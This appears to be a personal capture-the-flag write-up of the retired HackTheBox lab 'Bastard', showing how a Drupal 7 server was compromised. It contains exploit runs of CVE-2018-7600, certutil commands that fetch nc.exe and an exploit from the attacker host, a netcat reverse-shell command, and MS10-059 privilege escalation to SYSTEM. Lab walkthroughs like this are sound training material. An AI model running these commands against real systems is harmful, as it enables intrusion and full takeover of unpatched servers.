---
title: HackTheBox - Bastard
date: 2022-12-25
author: Marius
tags: [ctf, 'Hack The Box', 'htb', 'Windows']
---
Medium rated OSCP like box found in HackTheBox and NetSecFocus trophy list. Machine is Windows, quire old and is retired.

### Enumeration

Nmap scan with verbose output removed.

```
─$ nmap -sV -sV -T4 10.10.10.9 -v -p- | tee nmap_scan_all_ports

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 7.5
135/tcp   open  msrpc   Microsoft Windows RPC
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 284.51 seconds
```

### HTTP

Server is hosting Drupal. Tried default creds without any luck.

![alt text](/assets/img/bastard/1.png)

Inspecting source code, reveals that this is Drupal 7.

![alt text](/assets/img/bastard/2.png)

Performing a quick Google Search for Drupal 7 exploits I found this [Github Repo for CVE-2018-7600](https://github.com/pimps/CVE-2018-7600). And straight away tested if this works.

```
┌──(kali㉿kali)-[~/htb/bastard]
─$ git clone https://github.com/pimps/CVE-2018-7600 && cd CVE-2018-7600                    
Cloning into 'CVE-2018-7600'...
remote: Enumerating objects: 36, done.
remote: Total 36 (delta 0), reused 0 (delta 0), pack-reused 36
Receiving objects: 100% (36/36), 11.31 KiB | 3.77 MiB/s, done.
Resolving deltas: 100% (9/9), done.
                                                                                                                    
┌──(kali㉿kali)-[~/htb/bastard/CVE-2018-7600]
└─$ python drupa7-CVE-2018-7600.py 

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

usage: drupa7-CVE-2018-7600.py [-h] [-c COMMAND] [-f FUNCTION] [-p PROXY] target
drupa7-CVE-2018-7600.py: error: the following arguments are required: target
                                                                                                                    

┌──(kali㉿kali)-[~/htb/bastard/CVE-2018-7600]
└─$ python drupa7-CVE-2018-7600.py -c "whoami" http://10.10.10.9

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-j_J4T4xsixuq1E2FyHKy9U_HKTZx9NDLcjgUDo6iIKk
[*] Triggering exploit to execute: whoami
nt authority\iusr
```

Looks like I can execute code on this server.

## Exploitation

Maybe not the most elegant solution, but I hosted a http.server using python and downloaded nc.exe with Certutil and then launched this exploit again to get a revershe shell.

```
──(kali㉿kali)-[~/htb/bastard/CVE-2018-7600]
└─$ python drupa7-CVE-2018-7600.py -c "certutil -urlcache -f http://10.10.14.4/nc.exe nc.exe" http://10.10.10.9

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-ng7njnhfXm7IoeHAs94mrVBu8jkLQKrAS3KLjcnBFQQ
[*] Triggering exploit to execute: certutil -urlcache -f http://10.10.14.4/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

                                                                                                                    
┌──(kali㉿kali)-[~/htb/bastard/CVE-2018-7600]
└─$ python drupa7-CVE-2018-7600.py -c "nc.exe 10.10.14.4 443 -e cmd.exe" http://10.10.10.9

=============================================================================
|          DRUPAL 7 <= 7.57 REMOTE CODE EXECUTION (CVE-2018-7600)           |
|                              by pimps                                     |
=============================================================================

[*] Poisoning a form and including it in cache.
[*] Poisoned form ID: form-SElO6qDbYY_P9l_TJ1kSsgRNWCEYOfHQR4NzGjbVlXY
[*] Triggering exploit to execute: nc.exe 10.10.14.4 443 -e cmd.exe
```

```
└─$ nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.9] 52895
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\inetpub\drupal-7.54>whoami /all
whoami /all

USER INFORMATION
----------------

User Name         SID     
================= ========
nt authority\iusr S-1-5-17


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Group used for deny only                          
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group


PRIVILEGES INFORMATION
----------------------

Privilege Name          Description                               State  
======================= ========================================= =======
SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
SeImpersonatePrivilege  Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege Create global objects                     Enabled

C:\inetpub\drupal-7.54>systeminfo
systeminfo

Host Name:                 BASTARD
OS Name:                   Microsoft Windows Server 2008 R2 Datacenter 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                55041-402-3582622-84461
Original Install Date:     18/3/2017, 7:04:46 ��
System Boot Time:          25/12/2022, 2:12:21 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     2.047 MB
Available Physical Memory: 1.577 MB
Virtual Memory: Max Size:  4.095 MB
Virtual Memory: Available: 3.590 MB
Virtual Memory: In Use:    505 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.9
```

### Privilege Escalation

I've used Windows Exploit suggester to see which exploit I could use here as sytem is quite old.

```
──(kali㉿kali)-[~/Windows-Exploit-Suggester]
└─$ python2 windows-exploit-suggester.py --database 2022-12-25-mssb.xls --systeminfo sysinfo.txt
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (utf-8)
[*] querying database file for potential vulnerabilities
[*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
[*] there are now 197 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
[+] windows version identified as 'Windows 2008 R2 64-bit'
[*] 
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
[E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[*] done
```

I chose to try [MS10-059](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059). I've cloned repo and hosted content with htpp.server.

```
C:\Users\dimitris\Desktop>cd C:\ && mkdir temp

C:\>cd temp
cd temp

C:\temp>certutil -urlcache -f http://10.10.14.4/ms10-59.exe ms10-059.exe
certutil -urlcache -f http://10.10.14.4/ms10-59.exe ms10-59.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.

C:\temp>ms10.exe 10.10.14.4 443
ms10.exe 10.10.14.4 443
'ms10.exe' is not recognized as an internal or external command,
operable program or batch file.

C:\temp>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is C4CD-C60B

 Directory of C:\temp

25/12/2022  02:32 ��    <DIR>          .
25/12/2022  02:32 ��    <DIR>          ..
25/12/2022  02:32 ��           784.384 ms10-59.exe
               1 File(s)        784.384 bytes
               2 Dir(s)   4.134.559.744 bytes free

C:\temp>ms10-59.exe 10.10.14.4 443
ms10-59.exe 10.10.14.4 443
/Chimichurri/-->This exploit gives you a Local System shell <BR>/Chimichurri/-->Changing registry values...<BR>/Chimichurri/-->Got SYSTEM token...<BR>/Chimichurri/-->Running reverse shell...<BR>/Chimichurri/-->Restoring default registry values...<BR>

└─$ nc -nvlp 443 
listening on [any] 443 ...
connect to [10.10.14.4] from (UNKNOWN) [10.10.10.9] 52899
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\temp>whoami
whoami
nt authority\system
```

That's all, I got root. Fun lab.